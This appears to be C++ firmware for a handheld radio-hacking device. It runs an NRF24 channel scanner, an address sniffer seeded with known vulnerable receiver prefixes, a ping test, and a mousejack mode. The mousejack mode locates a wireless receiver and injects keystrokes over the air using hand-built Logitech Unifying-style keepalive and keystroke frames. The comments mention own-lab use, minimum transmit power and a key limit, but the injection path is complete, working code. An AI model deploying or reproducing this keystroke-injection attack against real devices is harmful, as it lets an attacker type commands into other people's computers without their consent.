// NRF Tools Mode - NRF24 on the shared FSPI bus, tick-driven
#include "nrf_tools.h"
#include "../core/config.h"
#include <string.h>

bool NrfTools::running = false;
NrfTools::Tool NrfTools::tool = NrfTools::Tool::None;
NrfTools::RadioState NrfTools::rState = NrfTools::RadioState::NotProbed;
RF24 NrfTools::radio(NrfPins::CE, NrfPins::CSN);

uint8_t NrfTools::scanCh = 0;
uint8_t NrfTools::scanDwell = 0;
uint16_t NrfTools::chanHits[NRF_CHANNEL_COUNT] = {0};

uint8_t NrfTools::sniffCh = 2;   // common Unifying-ish default, user-steppable
uint8_t NrfTools::prefixIdx = 0;
uint16_t NrfTools::candIdx = 0;
NrfTools::Found NrfTools::foundList[NRF_FOUND_MAX];
uint8_t NrfTools::foundLen = 0;

NrfTools::PingState NrfTools::pingSt = NrfTools::PingState::Off;
uint16_t NrfTools::pingSentCount = 0;
uint16_t NrfTools::pingPongCount = 0;
uint16_t NrfTools::pingStreakCount = 0;
bool NrfTools::pingAutoOn = false;
uint32_t NrfTools::pingLastFireMs = 0;
uint32_t NrfTools::pingPayload = 0;

NrfTools::MjState NrfTools::mjSt = NrfTools::MjState::Off;
uint8_t NrfTools::mjTarget[5] = {0};
uint8_t NrfTools::mjKeyIdx = 0;
uint8_t NrfTools::mjTickFlip = 0;

// Curated seed prefixes (MSB-first first-3-bytes) from public mousejack
// research. Own-lab verification intended; extend at compile time.
static const uint8_t kKnownPrefixes[NRF_KNOWN_PREFIX_COUNT][3] = {
    {0xC2, 0x39, 0x30}, {0xC2, 0x38, 0x31}, {0xC2, 0x41, 0x32},
    {0xC2, 0x42, 0x33}, {0xC2, 0x43, 0x34}, {0xC2, 0x4A, 0x35},
    {0xC2, 0x52, 0x36}, {0xC2, 0x53, 0x37}, {0xC2, 0x56, 0x38},
    {0xC2, 0x58, 0x39}, {0xC2, 0x5D, 0x30}, {0xC2, 0x66, 0x31},
};

// True once start() actually claimed the shared bus (post-refusal starts
// must not drive CSN/G3 from stop(): a LoRa cap may own the pin).
static bool sBusClaimed = false;

void NrfTools::init() {
    // Static RF24 stores pins only; SPI traffic starts in start().
}

void NrfTools::applyBusDiscipline() {
    // One CS low at a time on the shared FSPI bus: NRF CSN and SD CS both
    // deasserted before the radio touches the bus.
    pinMode(NrfPins::CSN, OUTPUT);
    digitalWrite(NrfPins::CSN, HIGH);
    pinMode(Config::sdCsPin(), OUTPUT);
    digitalWrite(Config::sdCsPin(), HIGH);
}

void NrfTools::start() {
    if (running) return;

    // LoRa-cap conflict guard: CAP_LORA GPS owns G3 (LORA_RESET/CE collision)
    // and forces GPS UART onto G13/G15. Refuse with a visible reason.
    if (Config::gps().enabled && Config::gps().source == GPSSource::CAP_LORA) {
        Serial.println("[NRF] start refused: GPS source CAP_LORA conflicts (G3/G13/G15)");
        rState = RadioState::LoRaConflict;
        running = true;
        return;
    }

    applyBusDiscipline();
    sBusClaimed = true;

    if (!radio.begin(&Config::sdSpi())) {
        Serial.println("[NRF] radio.begin() failed: cap not detected");
        rState = RadioState::CapMissing;
        running = true;
        return;
    }

    // Register sanity read: begin() can succeed on marginal wiring, so a real
    // readback check separates "no cap" from "cap present but flaky".
    if (!radio.isChipConnected()) {
        Serial.println("[NRF] begin ok but registers unreadable: radio unresponsive");
        rState = RadioState::Unresponsive;
        running = true;
        return;
    }

    // Legal ERP cap (Kepmen Kominfo 260/2024, 100mW ERP ceiling): MIN only.
    // This is the single PA enforcement site in the tree.
    radio.setPALevel(RF24_PA_MIN);

    tool = Tool::None;
    rState = RadioState::Ready;
    running = true;
    Serial.printf("[NRF] radio ready on ch<=83, PA_MIN (CE=%u CSN=%u)\n",
                  NrfPins::CE, NrfPins::CSN);
}

void NrfTools::stop() {
    if (tool == Tool::Scanner) endScanner();
    if (tool == Tool::Sniffer) endSniffer();
    if (tool == Tool::Ping) endPing();
    if (tool == Tool::Mousejack) endMousejack();
    if (sBusClaimed) {
        if (rState == RadioState::Ready) {
            radio.powerDown();  // standby, CE effect gone
        }
        applyBusDiscipline();  // CSN + SD CS high: bus released
        sBusClaimed = false;
    }
    if (running) Serial.println("[NRF] NRF tools stop");
    running = false;
    rState = RadioState::NotProbed;
}

void NrfTools::update() {
    if (!running) return;
    if (tool == Tool::Scanner) scannerTick();
    else if (tool == Tool::Sniffer) snifferTick();
    else if (tool == Tool::Ping) pingTick();
    else if (tool == Tool::Mousejack) mousejackTick();
}

// ---- Scanner: carrier/RPD dwell, one channel per dwell window ----

void NrfTools::beginScanner() {
    if (rState != RadioState::Ready) return;
    memset(chanHits, 0, sizeof(chanHits));
    scanCh = 0;
    scanDwell = 0;
    radio.setAutoAck(false);
    radio.setAddressWidth(5);
    radio.setPayloadSize(NRF_PAYLOAD_MAX);
    radio.setDataRate(RF24_2MBPS);
    static const uint8_t scanPipe[5] = {0xE7, 0xE7, 0xE7, 0xE7, 0xE7};
    radio.openReadingPipe(1, scanPipe);  // any pipe; we only sample RPD
    radio.setChannel(0);
    radio.startListening();
    tool = Tool::Scanner;
    Serial.println("[NRF] scanner start (ch 0-83, RPD dwell)");
}

void NrfTools::endScanner() {
    if (tool != Tool::Scanner) return;
    radio.stopListening();
    tool = Tool::None;
}

void NrfTools::scannerTick() {
    // Sample the current channel's carrier flag once per tick.
    if (radio.testCarrier()) {
        if (chanHits[scanCh] < 0xFFFF) chanHits[scanCh]++;
    }
    if (++scanDwell < NRF_SCAN_DWELL_TICKS) return;

    // Dwell window done: step to the next channel (pure step mirrors native).
    scanCh = scannerNextChannel(scanCh);
    scanDwell = 0;
    radio.setChannel(scanCh);
}

// ---- Address-discovery sniffer: one candidate address per tick ----

void NrfTools::beginSniffer() {
    if (rState != RadioState::Ready) return;
    prefixIdx = 0;
    candIdx = 0;
    foundLen = 0;
    radio.setAutoAck(false);
    radio.setCRCLength(RF24_CRC_DISABLED);  // plain ShockBurst, no CRC
    radio.setAddressWidth(5);
    radio.setPayloadSize(NRF_PAYLOAD_MAX);
    radio.setDataRate(RF24_2MBPS);
    radio.setChannel(sniffCh);
    uint8_t cand[5];
    candidateFromPrefix(kKnownPrefixes[0], 0, cand);
    radio.openReadingPipe(1, cand);
    radio.startListening();
    tool = Tool::Sniffer;
    Serial.printf("[NRF] sniffer start (ch %u, %u prefixes x %u candidates)\n",
                  sniffCh, NRF_KNOWN_PREFIX_COUNT, NRF_SUFFIX_CYCLE_MAX);
}

void NrfTools::endSniffer() {
    if (tool != Tool::Sniffer) return;
    radio.stopListening();
    radio.setCRCLength(RF24_CRC_16);  // leave the radio in a sane default
    tool = Tool::None;
}

void NrfTools::snifferTick() {
    // Non-blocking poll on the current candidate pipe.
    if (radio.available()) {
        Found f;
        memset(&f, 0, sizeof(f));
        radio.read(f.payload, NRF_PAYLOAD_MAX);  // fixed 32B read, no dyn-pl
        f.payloadLen = NRF_PAYLOAD_MAX;
        candidateFromPrefix(kKnownPrefixes[prefixIdx], candIdx, f.addr);
        f.channel = sniffCh;
        if (foundLen < NRF_FOUND_MAX) {
            foundList[foundLen++] = f;
        } else {
            memmove(&foundList[0], &foundList[1], sizeof(Found) * (NRF_FOUND_MAX - 1));
            foundList[NRF_FOUND_MAX - 1] = f;
        }
        if (chanHits[sniffCh] < 0xFFFF) chanHits[sniffCh]++;  // ch hit counter
        Serial.printf("[NRF] hit ch%u addr %02X%02X%02X%02X%02X len %u\n",
                      sniffCh, f.addr[0], f.addr[1], f.addr[2], f.addr[3],
                      f.addr[4], f.payloadLen);
    }

    // One candidate per tick: cycle suffix byte, then next prefix.
    if (++candIdx >= NRF_SUFFIX_CYCLE_MAX) {
        candIdx = 0;
        prefixIdx = (prefixIdx + 1) % NRF_KNOWN_PREFIX_COUNT;
    }
    uint8_t cand[5];
    candidateFromPrefix(kKnownPrefixes[prefixIdx], candIdx, cand);
    radio.openReadingPipe(1, cand);
}

void NrfTools::sniffChannelStep(int8_t delta) {
    int16_t ch = (int16_t)sniffCh + delta;
    if (ch < 0) ch = 0;
    if (ch > NRF_CHANNEL_MAX) ch = NRF_CHANNEL_MAX;
    if (ch == sniffCh) return;
    sniffCh = (uint8_t)ch;
    if (tool == Tool::Sniffer) radio.setChannel(sniffCh);
}

// Shared RX-probe radio config for sniffer + mousejack scan.
void NrfTools::rxProbeSetup() {
    radio.setAutoAck(false);
    radio.setCRCLength(RF24_CRC_DISABLED);  // plain ShockBurst, no CRC
    radio.setAddressWidth(5);
    radio.setPayloadSize(NRF_PAYLOAD_MAX);
    radio.setDataRate(RF24_2MBPS);
    radio.setChannel(sniffCh);
}

// ---- Ping: enhanced-ShockBurst write-ack against a stock GettingStarted node ----

void NrfTools::beginPing() {
    if (rState != RadioState::Ready) return;
    // Wire-compatible with the stock RF24 GettingStarted example pair.
    static const uint8_t addr1[5] = {'1', 'N', 'o', 'd', 'e'};
    static const uint8_t addr2[5] = {'2', 'N', 'o', 'd', 'e'};
    radio.setAutoAck(true);       // ACK payload of the pair IS the pong
    radio.setCRCLength(RF24_CRC_16);
    radio.setAddressWidth(5);
    radio.setPayloadSize(NRF_PAYLOAD_MAX);
    radio.setDataRate(RF24_1MBPS);  // example default rate
    radio.setChannel(76);           // example default channel
    radio.openWritingPipe(addr1);
    radio.openReadingPipe(1, addr2);
    radio.stopListening();
    pingSentCount = 0;
    pingPongCount = 0;
    pingStreakCount = 0;
    pingAutoOn = false;
    pingLastFireMs = 0;
    pingPayload = 0;
    pingSt = PingState::Armed;
    tool = Tool::Ping;
    Serial.println("[NRF] ping armed (pairs with RF24 GettingStarted, ch76)");
}

void NrfTools::endPing() {
    if (tool != Tool::Ping) return;
    pingSt = PingState::Off;
    tool = Tool::None;
}

void NrfTools::pingToggleAuto() {
    pingAutoOn = !pingAutoOn;
    Serial.printf("[NRF] ping auto %s\n", pingAutoOn ? "ON" : "OFF");
}

void NrfTools::pingFireOnce() {
    if (tool != Tool::Ping || pingSt == PingState::Waiting) return;
    pingLastFireMs = millis();
    pingPayload++;
    // One blocking write per tick: ESB retries bounded by library defaults.
    bool ok = radio.write(&pingPayload, sizeof(pingPayload));
    pingSentCount++;
    if (ok) {
        pingPongCount++;
        pingStreakCount++;
        pingSt = PingState::Pong;
    } else {
        pingStreakCount = 0;
        pingSt = PingState::Miss;
    }
}

void NrfTools::pingTick() {
    if (pingAutoOn && pingSt != PingState::Waiting &&
        millis() - pingLastFireMs >= NRF_PING_AUTO_INTERVAL_MS) {
        pingFireOnce();
    }
}

// ---- Mousejack: prefix scan then Unifying-class keystroke injection ----

void NrfTools::beginMousejack() {
    if (rState != RadioState::Ready) return;
    prefixIdx = 0;
    candIdx = 0;
    memset(mjTarget, 0, sizeof(mjTarget));
    mjKeyIdx = 0;
    mjTickFlip = 0;
    rxProbeSetup();
    uint8_t cand[5];
    candidateFromPrefix(kKnownPrefixes[0], 0, cand);
    radio.openReadingPipe(1, cand);
    radio.startListening();
    mjSt = MjState::Scanning;
    tool = Tool::Mousejack;
    Serial.println("[NRF] mousejack scan start (own-lab targets only)");
}

void NrfTools::endMousejack() {
    if (tool != Tool::Mousejack) return;
    if (mjSt == MjState::Injecting || mjSt == MjState::Finished ||
        mjSt == MjState::Aborted) {
        radio.stopListening();
    }
    radio.setCRCLength(RF24_CRC_16);
    mjSt = MjState::Off;
    tool = Tool::None;
}

void NrfTools::mousejackGo() {
    if (mjSt != MjState::Ready) return;
    radio.stopListening();
    radio.setAutoAck(false);   // plain ShockBurst, no ACK round trip
    radio.openWritingPipe(mjTarget);
    radio.setChannel(sniffCh);
    mjKeyIdx = 0;
    mjTickFlip = 0;
    mjSt = MjState::Injecting;
    Serial.printf("[NRF] mousejack inject GO: %02X%02X%02X%02X%02X ch%u\n",
                  mjTarget[0], mjTarget[1], mjTarget[2], mjTarget[3],
                  mjTarget[4], sniffCh);
}

void NrfTools::mousejackAbort() {
    if (tool != Tool::Mousejack) return;
    if (mjSt == MjState::Injecting) {
        Serial.println("[NRF] mousejack ABORTED by user");
        mjSt = MjState::Aborted;
    }
}

const uint8_t* NrfTools::mousejackTarget() { return mjTarget; }

void NrfTools::mousejackChannelStep(int8_t delta) {
    sniffChannelStep(delta);
    if (mjSt == MjState::Scanning) radio.setChannel(sniffCh);
}

void NrfTools::mousejackTick() {
    if (mjSt == MjState::Scanning) {
        // Same one-candidate-per-tick probe as the sniffer.
        if (radio.available()) {
            uint8_t payload[NRF_PAYLOAD_MAX];
            radio.read(payload, sizeof(payload));
            candidateFromPrefix(kKnownPrefixes[prefixIdx], candIdx, mjTarget);
            if (chanHits[sniffCh] < 0xFFFF) chanHits[sniffCh]++;
            mjSt = MjState::Ready;
            Serial.printf("[NRF] mousejack target: %02X%02X%02X%02X%02X ch%u\n",
                          mjTarget[4], mjTarget[3], mjTarget[2], mjTarget[1],
                          mjTarget[0], sniffCh);
            return;
        }
        if (++candIdx >= NRF_SUFFIX_CYCLE_MAX) {
            candIdx = 0;
            prefixIdx = (prefixIdx + 1) % NRF_KNOWN_PREFIX_COUNT;
        }
        uint8_t cand[5];
        candidateFromPrefix(kKnownPrefixes[prefixIdx], candIdx, cand);
        radio.openReadingPipe(1, cand);
        return;
    }

    if (mjSt != MjState::Injecting) return;

    // Hard cap: never type forever, whatever the state machine thinks. The
    // proof text's NUL ends the run earlier, so mjKeyIdx never indexes past
    // the shorter of the two bounds.
    if (mjKeyIdx >= NRF_MJ_MAX_KEYS || NRF_MJ_PROOF_TEXT[mjKeyIdx] == '\0') {
        mjSt = MjState::Finished;
        Serial.println("[NRF] mousejack run complete");
        return;
    }

    // Alternate keepalive / keystroke frames, one write per tick, no ACK.
    uint8_t frame[NRF_PAYLOAD_MAX];
    size_t len;
    if (mjTickFlip == 0) {
        len = buildKeepaliveFrame(frame);
    } else {
        char c = NRF_MJ_PROOF_TEXT[mjKeyIdx];
        uint8_t mod = 0;
        uint8_t keys[6] = {0};
        if (c >= 'A' && c <= 'Z') {
            mod = 0x02;  // left shift
            c = (char)(c - 'A' + 'a');
        }
        uint8_t code = 0;
        hidKeyCode(c, code);
        keys[0] = code;
        len = buildKeystrokeFrame(frame, mod, keys);
        mjKeyIdx++;
    }
    mjTickFlip ^= 1;
    radio.write(frame, len, true);  // multicast=true: no-ACK ShockBurst
}

// ---- Pure helpers (mirrored in test/mocks/testable_functions.h; keep in sync) ----

void NrfTools::candidateFromPrefix(const uint8_t prefix[3], uint16_t idx,
                                   uint8_t out[5]) {
    // RF24 arrays are LSB-first on air: array[4] transmits first. Research
    // tables list prefixes in written (on-air) order, so the fixed bytes
    // park reversed at the array tail while the cycling suffix leads.
    out[0] = 0x00;
    out[1] = (uint8_t)(idx & 0xFF);
    out[2] = prefix[2];
    out[3] = prefix[1];
    out[4] = prefix[0];
}

uint8_t NrfTools::scannerNextChannel(uint8_t ch) {
    return (uint8_t)((ch + 1) % NRF_CHANNEL_COUNT);
}

size_t NrfTools::buildKeepaliveFrame(uint8_t out[NRF_PAYLOAD_MAX]) {
    // Logitech Unifying keepalive: 3 bytes, no CRC on air.
    out[0] = 0x00;
    out[1] = 0x40;
    out[2] = 0x04;
    return 3;
}

size_t NrfTools::buildKeystrokeFrame(uint8_t out[NRF_PAYLOAD_MAX], uint8_t mod,
                                     const uint8_t keys[6]) {
    // Unifying inject set-report: dev 0x00, 0xC1, wIndex 0x00, modifier,
    // reserved 0x00, six key slots.
    out[0] = 0x00;
    out[1] = 0xC1;
    out[2] = 0x00;
    out[3] = mod;
    out[4] = 0x00;
    memcpy(&out[5], keys, 6);
    return 11;
}

bool NrfTools::hidKeyCode(char c, uint8_t& out) {
    if (c >= 'a' && c <= 'z') {
        out = (uint8_t)(0x04 + (c - 'a'));
        return true;
    }
    if (c >= '1' && c <= '9') {
        out = (uint8_t)(0x1E + (c - '1'));
        return true;
    }
    if (c == '0') {
        out = 0x27;
        return true;
    }
    if (c == ' ') {
        out = 0x2C;
        return true;
    }
    if (c == '\n') {
        out = 0x28;
        return true;
    }
    return false;
}

const uint8_t* NrfTools::knownPrefix(uint8_t i) {
    return (i < NRF_KNOWN_PREFIX_COUNT) ? kKnownPrefixes[i] : nullptr;
}

const char* NrfTools::radioStateLine() {
    switch (rState) {
        case RadioState::NotProbed:   return "PROBING SNOUT...";
        case RadioState::CapMissing:  return "NO CAP RADIO. GO SOLDER ONE.";
        case RadioState::Unresponsive: return "RADIO MUTE. CHECK WIRING.";
        case RadioState::LoRaConflict: return "LORA CAP HOLDS G3. REFUSED.";
        case RadioState::Ready:       return "RADIO UP. PA_MIN BY LAW.";
        default:                      return "";
    }
}
